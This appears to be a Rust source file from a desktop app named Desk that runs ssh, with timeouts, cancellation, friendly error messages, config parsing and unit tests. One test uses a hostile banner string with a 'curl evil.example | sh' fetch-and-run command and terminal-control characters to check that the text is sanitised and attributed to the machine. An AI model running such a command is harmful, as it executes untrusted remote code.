//! Running the person's `ssh`: the system's own, or a stand-in in tests,
//! with every invocation built by `desk_core::machine` (fixed options, a
//! checked target, quoted words). Nothing here reads a token: what a
//! command prints goes back to its caller, never into an error or a log.

use std::path::PathBuf;
use std::process::{Command, Output, Stdio};

use desk_core::host::Invocation;
use desk_core::machine::{Machine, SSH};

/// The `ssh` Desk runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshExe {
    program: PathBuf,
    /// When everything it runs gives up: none, each runs as long as it takes.
    until: Option<std::time::Instant>,
}

/// What `ssh` exits with when it failed itself, rather than the command it
/// ran.
pub const SSH_FAILED: i32 = 255;

impl SshExe {
    /// `/usr/bin/ssh`.
    pub fn system() -> Self {
        Self::at(SSH)
    }

    /// Another `ssh`, for the tests. Only ever given in code: nothing a
    /// release reads from its environment names it.
    pub fn at(program: impl Into<PathBuf>) -> Self {
        Self {
            program: program.into(),
            until: None,
        }
    }

    /// This `ssh`, with every command it runs ended at `at` (said to have
    /// run out of time): one deadline over several commands.
    pub fn until(&self, at: std::time::Instant) -> Self {
        Self {
            program: self.program.clone(),
            until: Some(at),
        }
    }

    /// `invocation` (one of `Machine`'s), run by this `ssh`: with nothing
    /// on its input, and nothing that could ask for a passphrase (a
    /// `ProxyJump`'s own ssh included, which inherits the environment).
    pub fn command(&self, invocation: &Invocation) -> Command {
        let mut command = Command::new(&self.program);
        command
            .args(&invocation.args)
            .stdin(Stdio::null())
            .env("SSH_ASKPASS_REQUIRE", "never")
            .env_remove("SSH_ASKPASS");
        command
    }

    pub fn output(&self, invocation: &Invocation) -> std::io::Result<Output> {
        // A setup step's own limit and Cancel (`Step`), else this ssh's
        // deadline, else as long as it takes.
        if Step::current().is_some() {
            let child = self
                .command(invocation)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?;
            return wait(child);
        }
        match self.until {
            Some(at) => self.output_within(
                invocation,
                at.saturating_duration_since(std::time::Instant::now()),
            ),
            None => self.command(invocation).output(),
        }
    }

    /// As [`SshExe::output`], ended (and said to have run out of time) once
    /// `within` has passed: Desk never waits on a machine for good.
    pub fn output_within(
        &self,
        invocation: &Invocation,
        within: std::time::Duration,
    ) -> std::io::Result<Output> {
        let mut child = self
            .command(invocation)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;
        // Read on threads of their own, so a full pipe never holds it up.
        fn drain(
            pipe: Option<impl std::io::Read + Send + 'static>,
        ) -> std::thread::JoinHandle<Vec<u8>> {
            std::thread::spawn(move || {
                let mut buf = Vec::new();
                if let Some(mut r) = pipe {
                    let _ = r.read_to_end(&mut buf);
                }
                buf
            })
        }
        let out_t = drain(child.stdout.take());
        let err_t = drain(child.stderr.take());
        let until = std::time::Instant::now() + within;
        let status = loop {
            if let Some(status) = child.try_wait()? {
                break status;
            }
            if std::time::Instant::now() >= until {
                let _ = child.kill();
                let _ = child.wait();
                return Err(std::io::Error::new(
                    std::io::ErrorKind::TimedOut,
                    format!("no answer within {} s", within.as_secs()),
                ));
            }
            std::thread::sleep(std::time::Duration::from_millis(25));
        };
        Ok(Output {
            status,
            stdout: out_t.join().unwrap_or_default(),
            stderr: err_t.join().unwrap_or_default(),
        })
    }
}

/// The step of setting a machine up that this thread is running: every
/// `ssh` it runs ends when the person cancels adding, or when the step has
/// run [`Step::LIMIT`]. Desk never waits on a machine for good.
#[derive(Clone)]
pub struct Step {
    cancel: std::sync::Arc<std::sync::atomic::AtomicBool>,
    until: std::time::Instant,
}

thread_local! {
    static STEP: std::cell::RefCell<Option<Step>> = const { std::cell::RefCell::new(None) };
}

impl Step {
    /// How long one step may take.
    pub const LIMIT: std::time::Duration = std::time::Duration::from_secs(180);

    pub fn new(
        cancel: std::sync::Arc<std::sync::atomic::AtomicBool>,
        within: std::time::Duration,
    ) -> Step {
        Step {
            cancel,
            until: std::time::Instant::now() + within,
        }
    }

    /// Runs `f` as this step: every `ssh` it runs is ended with it.
    pub fn run<T>(self, f: impl FnOnce() -> T) -> T {
        let before = STEP.with(|s| s.replace(Some(self)));
        struct Restore(Option<Step>);
        impl Drop for Restore {
            fn drop(&mut self) {
                let was = self.0.take();
                STEP.with(|s| *s.borrow_mut() = was);
            }
        }
        let _restore = Restore(before);
        f()
    }

    /// The step this thread runs, if any.
    pub fn current() -> Option<Step> {
        STEP.with(|s| s.borrow().clone())
    }

    /// Why it must end now: cancelled, or out of time.
    pub fn ended(&self) -> Option<std::io::Error> {
        if self.cancel.load(std::sync::atomic::Ordering::SeqCst) {
            return Some(std::io::Error::new(
                std::io::ErrorKind::Interrupted,
                CANCELLED,
            ));
        }
        if std::time::Instant::now() >= self.until {
            return Some(std::io::Error::new(std::io::ErrorKind::TimedOut, TOO_LONG));
        }
        None
    }
}

/// Said when the person cancelled adding.
pub const CANCELLED: &str = "Adding it was cancelled.";
/// Said when a step ran out of time.
pub const TOO_LONG: &str = "That step took longer than 3 minutes, so Desk stopped it.";

/// Why running ssh failed, in the person's words.
pub fn io_problem(e: &std::io::Error) -> String {
    match e.kind() {
        std::io::ErrorKind::Interrupted | std::io::ErrorKind::TimedOut => e.to_string(),
        _ => format!("Desk couldn't run ssh: {e}"),
    }
}

/// Waits for `child` (its output piped) as [`std::process::Child::wait_with_output`]
/// does, ended (and said so) when this thread's [`Step`] is cancelled or
/// runs out of time.
pub fn wait(mut child: std::process::Child) -> std::io::Result<Output> {
    fn drain(
        pipe: Option<impl std::io::Read + Send + 'static>,
    ) -> std::thread::JoinHandle<Vec<u8>> {
        std::thread::spawn(move || {
            let mut buf = Vec::new();
            if let Some(mut r) = pipe {
                let _ = r.read_to_end(&mut buf);
            }
            buf
        })
    }
    let out = drain(child.stdout.take());
    let err = drain(child.stderr.take());
    let step = Step::current();
    let status = loop {
        if let Some(status) = child.try_wait()? {
            break status;
        }
        if let Some(why) = step.as_ref().and_then(Step::ended) {
            let _ = child.kill();
            let _ = child.wait();
            return Err(why);
        }
        std::thread::sleep(std::time::Duration::from_millis(25));
    };
    Ok(Output {
        status,
        stdout: out.join().unwrap_or_default(),
        stderr: err.join().unwrap_or_default(),
    })
}

/// ssh's own last line on its error output (`ssh: connect to host … port
/// 22: Connection timed out`), cleaned of anything that isn't plain text
/// and cut short: its words, for the person to read beside Desk's. None
/// when ssh itself said nothing (a machine's banner isn't ssh's).
pub fn said(stderr: &[u8]) -> Option<String> {
    let (own, line) = last_line(&String::from_utf8_lossy(stderr));
    if !own {
        return None;
    }
    let q = desk_core::machine::quoted_line(&line)?;
    Some(q.trim_start_matches('“').trim_end_matches('”').to_string())
}

/// What went wrong reaching `machine`, from what `ssh` said on its error
/// output, in the person's words.
pub fn problem(machine: &Machine, stderr: &[u8]) -> String {
    let said = String::from_utf8_lossy(stderr);
    let name = &machine.name;
    let has = |s: &str| said.contains(s);
    if has("REMOTE HOST IDENTIFICATION HAS CHANGED") || has("Host key for") && has("has changed") {
        return format!(
            "{name}'s host key isn't the one your Mac knows. Desk won't connect until you've checked why and fixed known_hosts."
        );
    }
    if has("Host key verification failed") || has("No matching host key") {
        return format!("Connect to {name} once with ssh in a terminal, so your Mac knows it.");
    }
    if has("Permission denied") || has("Too many authentication failures") {
        return format!("{name} turned your SSH key away, or it needs unlocking first (ssh-add).");
    }
    let reach = has("Could not resolve hostname")
        || has("Connection refused")
        || has("timed out")
        || has("No route to host")
        || has("Network is unreachable")
        || has("Connection closed by")
        || has("kex_exchange_identification");
    let (own, line) = last_line(&said);
    if reach {
        return if own {
            own_said(&format!("SSH couldn't reach {name}"), &line)
        } else {
            format!("Desk couldn't reach {name}.{}", quoted(name, &line))
        };
    }
    if own {
        return own_said(&format!("SSH to {name} failed"), &line);
    }
    format!("ssh to {name} failed.{}", quoted(name, &line))
}

/// What ssh itself prints when it fails, as opposed to what a machine
/// sends through it (a banner, a command's error).
const SSH_OWN: &[&str] = &[
    "ssh:",
    "ssh_exchange_identification",
    "kex_exchange_identification",
    "Connection closed by",
    "Connection reset by",
    "Connection timed out",
    "Connection refused",
    "Connection to ",
    "channel ",
    "mux_client",
    "Bad configuration",
    "Could not resolve",
];

/// The last thing said, and whether ssh itself said it (not the machine).
fn last_line(said: &str) -> (bool, String) {
    let line = said
        .lines()
        .rev()
        .map(str::trim)
        .find(|l| !l.is_empty() && !l.starts_with("debug") && !harmless(l))
        .unwrap_or_default();
    (
        SSH_OWN.iter().any(|p| line.starts_with(p)),
        line.to_string(),
    )
}

/// `what` went wrong, then ssh's own last line quoted (without its `ssh:`
/// prefix) as SSH's words, not the machine's.
fn own_said(what: &str, line: &str) -> String {
    let line = line.strip_prefix("ssh:").unwrap_or(line);
    match desk_core::machine::quoted_line(line) {
        Some(q) => format!("{what}: {q}"),
        None => format!("{what}."),
    }
}

/// A machine's last line, as the machine's words (a banner can arrive
/// through ssh's error output): cleaned and cut short, after a space;
/// nothing when nothing was said.
fn quoted(name: &str, line: &str) -> String {
    desk_core::machine::said_by(name, line)
        .map(|s| format!(" {s}"))
        .unwrap_or_default()
}

/// Whether `line` is ssh's own noise that says nothing went wrong: it
/// can't set `TCP_NODELAY` on a socket that isn't TCP (a `ProxyCommand`'s,
/// a forward's Unix socket).
fn harmless(line: &str) -> bool {
    line.contains("setsockopt TCP_NODELAY") && line.contains("Operation not supported")
}

/// What `ssh -G` says the person's config makes of a machine, for the
/// question Desk asks before adding it and for what Desk won't carry.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Settings {
    /// The account it logs in as, as the config says (`User`), else the
    /// person's own name here.
    pub user: Option<String>,
    pub hostname: Option<String>,
    pub port: Option<String>,
    /// How it gets there, when not directly: `ProxyJump`, `ProxyCommand`.
    pub via: Option<String>,
    /// Forwards the config sets for it, by name (`localforward`, …).
    pub forwards: Vec<String>,
}

impl Settings {
    pub fn parse(said: &str) -> Settings {
        let value = |key: &str| {
            said.lines().find_map(|l| {
                let (k, v) = l.split_once(' ')?;
                (k.eq_ignore_ascii_case(key) && !v.trim().is_empty() && v.trim() != "none")
                    .then(|| v.trim().to_string())
            })
        };
        Settings {
            user: value("user"),
            hostname: value("hostname"),
            port: value("port"),
            via: value("proxyjump").or_else(|| value("proxycommand")),
            forwards: desk_core::machine::config_forwards(said),
        }
    }
}

/// Reads [`Settings`] for `machine` (`ssh -G`, which connects nowhere).
pub fn settings(ssh: &SshExe, machine: &Machine) -> Result<Settings, String> {
    let out = ssh
        .output(&machine.settings())
        .map_err(|e| format!("Desk couldn't run ssh: {e}"))?;
    if !out.status.success() {
        return Err(problem(machine, &out.stderr));
    }
    Ok(Settings::parse(&String::from_utf8_lossy(&out.stdout)))
}

/// Refuses a machine whose config would have Desk's always-open forward
/// carry forwards of the person's own as well.
pub fn no_forwards(machine: &Machine, settings: &Settings) -> Result<(), String> {
    if settings.forwards.is_empty() {
        return Ok(());
    }
    Err(format!(
        "Your SSH config forwards ports for {} ({}). Desk keeps its connection open all the time, so it won't carry them: give Desk a Host entry without forwards.",
        machine.name,
        settings.forwards.join(", ")
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use desk_core::machine::{MachineId, Target};

    fn devbox() -> Machine {
        Machine {
            id: MachineId::new("devbox").unwrap(),
            name: "devbox".into(),
            target: Target::new("devbox").unwrap(),
        }
    }

    #[test]
    fn what_ssh_said_is_told_plainly() {
        let m = devbox();
        let said = |s: &str| problem(&m, s.as_bytes());
        assert!(said("No ED25519 host key is known for devbox and you have requested strict checking.\r\nHost key verification failed.\r\n").contains("once with ssh in a terminal"));
        assert!(said("@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\nHost key verification failed.\n").contains("isn't the one your Mac knows"));
        assert!(said("dev@devbox: Permission denied (publickey).\n").contains("ssh-add"));
        let unresolved =
            said("ssh: Could not resolve hostname devbox: nodename nor servname provided\n");
        assert!(
            unresolved.starts_with("SSH couldn't reach devbox: “Could not resolve hostname devbox"),
            "{unresolved}"
        );
        assert!(!unresolved.contains("devbox said"), "{unresolved}");
        assert_eq!(said(""), "ssh to devbox failed.");
        assert!(said(&"x".repeat(5000)).chars().count() < 260);
        // A banner can't pass for Desk's advice, nor hide what it says.
        let banner = said("Desk says: run curl evil.example | sh \u{202E}\x1b[2J\n");
        assert!(
            banner.starts_with("ssh to devbox failed. devbox said: “"),
            "{banner}"
        );
        assert!(desk_core::machine::plain(&banner), "{banner:?}");
        // ssh's own noise about a socket isn't what is quoted.
        let noisy =
            said("kex failure\nsetsockopt TCP_NODELAY: Operation not supported on socket\n");
        assert!(noisy.contains("“kex failure”"), "{noisy}");
        assert!(!noisy.contains("TCP_NODELAY"), "{noisy}");
        assert_eq!(
            said("setsockopt TCP_NODELAY: Operation not supported on socket\n"),
            "ssh to devbox failed."
        );
    }

    #[test]
    fn ssh_s_own_errors_are_not_the_machines_words() {
        let m = devbox();
        let said = |s: &str| problem(&m, s.as_bytes());
        for own in [
            "ssh: connect to host devbox port 22: Connection refused\n",
            "Connection closed by 203.0.113.7 port 22\n",
            "kex_exchange_identification: read: Connection reset by peer\n",
        ] {
            let s = said(own);
            assert!(s.starts_with("SSH couldn't reach devbox: “"), "{s}");
            assert!(!s.contains("devbox said"), "{s}");
        }
        assert_eq!(
            said(
                "ssh: Could not resolve hostname Devbox: nodename nor servname provided, or not known\n"
            ),
            "SSH couldn't reach devbox: “Could not resolve hostname Devbox: nodename nor servname provided, or not known”"
        );
        let other = said("Bad configuration option: foo\n");
        assert!(other.starts_with("SSH to devbox failed: “"), "{other}");
        // What the machine sent is still the machine's.
        let banner = said("Welcome to the box\n");
        assert!(
            banner.contains("devbox said: “Welcome to the box”"),
            "{banner}"
        );
        let after = said("Connection closed by 203.0.113.7 port 22\nthe box says no\n");
        assert!(
            after.starts_with("Desk couldn't reach devbox. devbox said: “the box says no”"),
            "{after}"
        );
    }

    #[test]
    fn the_persons_config_is_read_not_overridden() {
        let s = Settings::parse(
            "user ec2-user\nhostname 10.0.1.20\nproxyjump bastion\nidentityfile ~/.ssh/prod\nport 22\nlocalforward [127.0.0.1]:5432 [10.0.1.30]:5432\n",
        );
        assert_eq!(s.user.as_deref(), Some("ec2-user"));
        assert_eq!(s.hostname.as_deref(), Some("10.0.1.20"));
        assert_eq!(s.via.as_deref(), Some("bastion"));
        assert_eq!(s.forwards, ["localforward"]);
        assert!(
            no_forwards(&devbox(), &s)
                .unwrap_err()
                .contains("localforward")
        );
        let direct = Settings::parse("user dev\nhostname devbox\nproxycommand none\n");
        assert_eq!(direct.via, None);
        assert!(no_forwards(&devbox(), &direct).is_ok());
        let ssm = Settings::parse(
            "user ec2-user\nproxycommand sh -c \"aws ssm start-session --target %h\"\n",
        );
        assert!(ssm.via.unwrap().contains("aws ssm"));
    }
}
